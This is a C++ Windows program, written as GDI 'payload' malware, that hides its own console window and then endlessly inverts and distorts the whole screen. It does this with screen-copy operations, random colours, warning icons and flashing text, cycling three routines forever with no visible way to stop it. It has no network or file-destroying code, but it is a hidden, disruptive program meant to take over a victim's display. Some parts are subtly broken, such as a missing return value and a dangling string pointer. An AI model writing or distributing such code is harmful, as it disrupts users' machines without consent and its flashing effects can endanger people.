#include <iostream>
#include <Windows.h>
#include <dxgi.h>
#include <intrin.h>
#include <shlobj_core.h>
#include <random>

#pragma comment(lib, "dxgi.lib")

HDC hdc = GetDC(0);

COLORREF rand_color() {
    return RGB(rand() % 255, rand() % 255, rand() % 255);
}

static int randomize() {
    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    int mt = 0;
    int ma = 0;
    if (GlobalMemoryStatusEx(&ms)) {
        mt = ms.ullTotalPhys;
        ma = ms.ullAvailPhys;
    }
    else {
        return 0;
    }
    int dvm, dsm, ssm = 0;
    IDXGIFactory* pf = nullptr;
    if (CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pf) == S_OK) {
        IDXGIAdapter* pa;
        if (pf->EnumAdapters(0, &pa) == S_OK) {
            DXGI_ADAPTER_DESC ad;
            if (pa->GetDesc(&ad) == S_OK) {
                dvm = ad.DedicatedVideoMemory;
                dsm = ad.DedicatedSystemMemory;
                ssm = ad.SharedSystemMemory;
            }
            else {
                return 0;
            }
            pa->Release();
        }
        else {
            return 0;
        }
        pf->Release();
    }
    else {
        return 0;
    }
    int hwid{};
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfile(&hwProfileInfo)) {
        hwid = (int)hwProfileInfo.szHwProfileGuid;
    }
    LARGE_INTEGER t, freq;
    if (!QueryPerformanceFrequency(&freq)) {
        return 0;
    }
    if (!QueryPerformanceCounter(&t)) {
        return 0;
    }
    double wt = (double)t.QuadPart / freq.QuadPart;
    double ct;
    FILETIME a, b, c, d;
    if (GetProcessTimes(GetCurrentProcess(), &a, &b, &c, &d) != 0) {
        ct = (double)(d.dwLowDateTime | ((unsigned long long)d.dwHighDateTime << 32)) * 0.0000001;
    }
    else {
        return 0;
    }
    srand((((((unsigned int)time(0) << (unsigned int)hwid >> (unsigned int)ct * 0x23 ^ 0xFF3E) ^ static_cast<unsigned int>(sin((unsigned int)clock())) >> (unsigned int)wt) ^ 0xFF << 0x3 + (unsigned int)ma) * (unsigned int)mt ^ 2 << (unsigned int)dvm >> (unsigned int)dsm >> (unsigned int)ssm) ^ (unsigned int)__rdtsc() ^ 0xF3 >> 0x877);
}

static void p1() {
    for (;;) {
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        randomize();
        HBRUSH b = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, b);
        PatBlt(hdc, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        StretchBlt(hdc, 0, 0, rand() % 3 + x, rand() % 3 + y, hdc, 0, 0, x, y, SRCPAINT);
        SetBkColor(hdc, rand_color());
        SetTextColor(hdc, rand_color());
        TextOut(hdc, rand() % x, rand() % y, L":O", 2);
        TextOut(hdc, rand() % x, rand() % y, L"VVV VVV VVV VVV", 16);
        BitBlt(hdc, rand() % 100 - 50, rand() % 100 - 50, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 20, 0, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 20, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, -20, x, y, hdc, 0, 0, SRCCOPY);
        StretchBlt(hdc, -10, 0, x + 20, y, hdc, 0, 0, x, y, SRCPAINT);
        StretchBlt(hdc, 0, -10, x, y + 20, hdc, 0, 0, x, y, SRCPAINT);
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
        int tx = rand() % x, ty = rand() % y;
        BitBlt(hdc, tx, ty, tx, ty, hdc, tx + 30, ty, SRCCOPY);
        int rpx = rand() % x;
        int rpy = rand() % y;
        int rsx = rand() % x;
        int rsy = rand() % y;
        StretchBlt(hdc, rpx, rpy, rsx - 10, rsy - 10, hdc, rpx, rpy, rsx, rsy, SRCCOPY);
        POINT cpos;
        GetCursorPos(&cpos);
        DrawIcon(hdc, cpos.x, cpos.y, LoadIcon(0, IDI_WARNING));
    }

    ReleaseDC(GetDesktopWindow(), hdc);
}

static void p2() {
    int i = 0;
    for (;;) {
        randomize();
        i++;
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(rand_color());
        SelectObject(hdc, brush);
        PatBlt(hdc, rand() % x, rand() % x, rand() % x, rand() % x, PATINVERT);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        BitBlt(hdc, 5, 5, x, y, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, -5, -5, x, y, hdc, 0, 0, SRCCOPY);
        int rpx = rand() % x;
        int rpy = rand() % y;
        int rsx = rand() % x;
        int rsy = rand() % y;
        StretchBlt(hdc, rpx, rpy, rsx + 5, rsy + 5, hdc, rpx, rpy, rsx, rsy, SRCCOPY);
        if (i == 10) {
            i = 0;
            StretchBlt(hdc, -3, -3, x + 3, y + 3, hdc, 0, 0, x, y, SRCPAINT);
            StretchBlt(hdc, 0, 0, x - 3, y - 3, hdc, 0, 0, x, y, SRCPAINT);
        }
        POINT plg[3] = {
            { rand() % 10, rand() % 10 },
            { rand() % 2 * x - 10, rand() % 10 },
            { rand() % 10, rand() % 2 * y - 10 }
        };
        PlgBlt(hdc, plg, hdc, 0, 0, x, y, 0, 0, 0);
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ASTERISK));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION));
        BitBlt(hdc, 0, rand() % y, x, 1, hdc, 0, rand() % y, SRCCOPY);
        BitBlt(hdc, rand() % x, 0, 1, y, hdc, rand() % x, 0, SRCCOPY);
        POINT cpos;
        GetCursorPos(&cpos);
        SetBkColor(hdc, rand_color());
        SetTextColor(hdc, rand_color());
        TextOut(hdc, rand() % x, rand() % y, L">w<", 3);
        TextOut(hdc, cpos.x, cpos.y, L"LSD", 4);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
}

static void p3() {
    int c = 0;
    int mint = 10;
    mint++;
    for (;;) {
        c++;
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        randomize();
        StretchBlt(hdc, 20, 0, x - 40, y, hdc, 0, 0, x, y, SRCPAINT);
        StretchBlt(hdc, 0, 20, x, y - 40, hdc, 0, 0, x, y, SRCPAINT);
        HBRUSH brush = CreateSolidBrush(rand_color());
        SelectObject(hdc, brush);
        PatBlt(hdc, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);
        PatBlt(hdc, - rand() % x, - rand() % y, rand() % x, rand() % y, PATINVERT);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        SetBkColor(hdc, rand_color());
        SetTextColor(hdc, rand_color());
        TextOut(hdc, rand() % x, rand() % y, L"??????????", 11);
        POINT point[3] = {
            {rand() % x, rand() % y},
            {rand() % x, rand() % y},
            {rand() % x, rand() % y}
        };
        PlgBlt(hdc, point, hdc, rand() % x, rand() % y, rand() % x, rand() % y, 0, 0, 0);
        POINT cpos;
        GetCursorPos(&cpos);
        PatBlt(hdc, cpos.x, cpos.y, 100, 100, PATCOPY);
        if (c == 20) {
            c = 0;
            int move = rand() % 4;
            switch (move) {
            case 0:
                for (int i = 1; i < mint; i++) {
                    SetBkColor(hdc, rand_color());
                    SetTextColor(hdc, rand_color());
                    TextOut(hdc, rand() % x, rand() % y, L"??????????", 11);
                    BitBlt(hdc, i * 10, 0, x, y, hdc, 0, 0, SRCCOPY);
                }
                break;
            case 1:
                for (int i = 1; i < mint; i++) {
                    SetBkColor(hdc, rand_color());
                    SetTextColor(hdc, rand_color());
                    TextOut(hdc, rand() % x, rand() % y, L"??????????", 11);
                    BitBlt(hdc, -i * 10, 0, x, y, hdc, 0, 0, SRCCOPY);
                }
                break;
            case 2:
                for (int i = 1; i < mint; i++) {
                    SetBkColor(hdc, rand_color());
                    SetTextColor(hdc, rand_color());
                    TextOut(hdc, rand() % x, rand() % y, L"??????????", 11);
                    BitBlt(hdc, 0, i * 10, x, y, hdc, 0, 0, SRCCOPY);
                }
                break;
            case 3:
                for (int i = 1; i < mint; i++) {
                    SetBkColor(hdc, rand_color());
                    SetTextColor(hdc, rand_color());
                    TextOut(hdc, rand() % x, rand() % y, L"??????????", 11);
                    BitBlt(hdc, 0, -i * 10, x, y, hdc, 0, 0, SRCCOPY);
                }
                break;
            }
        }
    }
}

static void invert() {
    for (;;) {
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, DSTINVERT);
    }
}

static void run_payload(int seconds, LPTHREAD_START_ROUTINE function) {
    HANDLE threadhandle = CreateThread(0, 0, function, 0, 0, 0);
    Sleep(seconds * 1000);
    TerminateThread(threadhandle, 0);
}

static const wchar_t* uuid() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 15);
    const char* hex_chars = "0123456789abcdef";
    std::string uuid = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
    for (char& c : uuid) {
        if (c == 'x') {
            c = hex_chars[dis(gen)];
        }
        else if (c == 'y') {
            c = hex_chars[(dis(gen) & 0x3) | 0x8];
        }
    }
    return (LPCWSTR)uuid.c_str();
}

static void set_title() {
    for (;;) {
        SetConsoleTitle(uuid());
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    FreeConsole();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)invert, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)set_title, 0, 0, 0);
    int time = 25;
    for (;;) {
        run_payload(time, (LPTHREAD_START_ROUTINE)p1);
        run_payload(time, (LPTHREAD_START_ROUTINE)p2);
        run_payload(time, (LPTHREAD_START_ROUTINE)p3);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}